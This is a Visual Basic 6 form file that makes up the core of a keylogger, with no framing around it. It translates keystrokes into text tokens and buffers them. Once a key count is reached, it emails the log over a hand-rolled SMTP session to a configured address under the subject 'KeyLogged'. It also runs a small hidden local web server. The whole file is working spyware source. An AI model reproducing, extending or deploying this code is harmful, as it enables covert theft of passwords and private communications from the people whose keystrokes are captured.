VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form_Main 
   BorderStyle     =   3  'Fixed Dialog
   ClientHeight    =   450
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   1530
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form_Main.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   450
   ScaleWidth      =   1530
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock Winsock2 
      Index           =   0
      Left            =   1080
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   600
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.PictureBox PictureBox_SendTo 
      Height          =   375
      Left            =   120
      ScaleHeight     =   315
      ScaleWidth      =   315
      TabIndex        =   0
      Top             =   0
      Visible         =   0   'False
      Width           =   375
   End
End
Attribute VB_Name = "Form_Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Dim Green_Light As Boolean
Dim Progress
Dim DATAFile As String
Dim data As String
Dim status As String

Dim Connections As Integer

Dim HTML As New HTML

                        
    
Private Sub PictureBox_SendTo_KeyDown(KeyCode As Integer, Shift As Integer)

    Dim MAP As String
    
    Select Case KeyCode
        Case 8
            MAP = "[BACKSPACE]"
        Case 9
            MAP = "[TAB]"
        Case 13, 108
            MAP = "[ENTER]" & vbCrLf
        Case 16
            MAP = "[SHIFT]"
        Case 17
            MAP = "[CTRL]"
        Case 18
            MAP = "[ALT]"
        Case 19
            MAP = "[PAUSE]"
        Case 20
            MAP = "[CAPSLOCK]"
        Case 27
            MAP = "[ESC]"
        Case 32
            MAP = "[SPACE]"
        Case 33
            MAP = "[PAGEUP]"
        Case 34
            MAP = "[PAGEDOWN]"
        Case 35
            MAP = "[END]"
        Case 36
            MAP = "[HOME]"
        Case 37
            MAP = "[LEFT]"
        Case 38
            MAP = "[UP]"
        Case 39
            MAP = "[RIGHT]"
        Case 40
            MAP = "[DOWN]"
        Case 42
            MAP = "[PRNSCR]"
        Case 45
            MAP = "[INS]"
        Case 46
            MAP = "[DEL]"
        Case 144
            MAP = "[NUMLOCK]"
        
        Case 65 To 90, 48 To 57, 96 To 105
            MAP = Chr(KeyCode)
        
        Case 106
            MAP = "*"
        Case 107
            MAP = "+"
        Case 109
            MAP = "-"
        Case 110
            MAP = "."
        Case 111
            MAP = "/"
    
        Case 112 To 127
            MAP = "[F" + Chr(KeyCode - 63) + "]"
        
        Case 91
            MAP = "[START]"
        Case 93
            MAP = "[MENU]"
        
        Case Else
            MAP = "[O" + CStr(KeyCode) + "]"
    End Select
            

Main_Md.HookText = Main_Md.HookText + MAP
    
    'Main_Md.HookText = Main_Md.HookText + CStr(Shift) + Chr(KeyCode)
    Main_Md.HookLen = Main_Md.HookLen + 1
    
    If Main_Md.HookLen > Main_Md.NumberOfKey Then
        Call sendmail
                
    End If
    
End Sub


Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)

Dim reply As String

Winsock1.GetData DATAFile
reply = Mid(DATAFile, 1, 3)
If reply = 250 Or reply = 354 Then
Progress = Progress + 1
End If
If reply = 220 Then
Green_Light = True
End If
End Sub

Public Sub StartWebServer()

    ' Starting Web Server
    Connections = 1
    Me.Winsock2(0).Close
    Me.Winsock2(0).LocalPort = Main_Md.WebPort
    Me.Winsock2(0).Listen

End Sub

Private Sub Winsock2_ConnectionRequest(Index As Integer, ByVal requestID As Long)

  If Index = 0 Then
      Connections = Connections + 1
      Load Winsock2(Connections)
      Winsock2(Connections).LocalPort = 0
      Winsock2(Connections).Accept requestID
      
  End If
End Sub

Private Sub Winsock2_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim strdata As String
Dim findget As String
Dim spc2 As String
Dim page As String

Winsock2(Index).GetData strdata$
If Mid$(strdata$, 1, 3) = "GET" Then
    findget = InStr(strdata$, "GET ")
    spc2 = InStr(findget + 5, strdata$, " ")
    page = Mid$(strdata$, findget + 5, spc2 - (findget + 4))
    
    findget = InStr(page, "?")
    If findget > 0 Then
        page = Mid(page, findget + 1)
            
    Else
        page = ""
    End If
    
    SendPage page, Index
End If
End Sub

Private Sub Winsock2_SendComplete(Index As Integer)
    Winsock2(Index).Close
End Sub
Public Sub SendPage(page As String, Index)

  Winsock2(Index).SendData HTML.MakeIt(page)
  
End Sub



Public Sub ChangeWebServerProt()

    Me.Winsock2(0).Close
    Me.Winsock2(0).LocalPort = Main_Md.WebPort
    Me.Winsock2(0).Listen

End Sub

Sub sendmail()

        data = Main_Md.HookText
        Main_Md.HookText = ""
        Main_Md.HookLen = 0
        
        status = ""
        Progress = 0
        Green_Light = False
        
        Winsock1.Close
        Winsock1.Connect Main_Md.SMTP_HOST, Main_Md.SMTP_PORT
        Do While Winsock1.State <> sckConnected
            DoEvents
        Loop


        Do While Green_Light = False
            DoEvents
        Loop
        
        Winsock1.SendData "MAIL FROM: " & Main_Md.MAIL_FROM & Chr$(13) & Chr$(10)

        Do While Progress <> 1
            DoEvents
        Loop
        
        Winsock1.SendData "RCPT TO: " & Main_Md.RCPT_TO & Chr$(13) & Chr$(10)

        Do While Progress <> 2
            DoEvents
        Loop
        
        Winsock1.SendData "DATA" & Chr$(13) & Chr$(10)

        Do While Progress <> 3
            DoEvents
        Loop

        Winsock1.SendData "FROM: " & Main_Md.From & " <" & Main_Md.MAIL_FROM & ">" & Chr$(13) & Chr$(10)
        Winsock1.SendData "TO: " & Main_Md.MAIL_TO & " <" & Main_Md.RCPT_TO & ">" & Chr$(13) & Chr$(10)
        Winsock1.SendData "SUBJECT:KeyLogged " & Date & " " & Time & Chr$(13) & Chr$(10)
        Winsock1.SendData Chr$(13) & Chr$(10)
        Winsock1.SendData data & Chr$(13) & Chr$(10)

        Winsock1.SendData Chr$(13) & Chr$(10) & "." & Chr$(13) & Chr$(10)

        Do While Progress <> 4
            DoEvents
        Loop

        Winsock1.SendData "QUIT" & Chr$(13) & Chr$(10)

        Winsock1.Close

End Sub
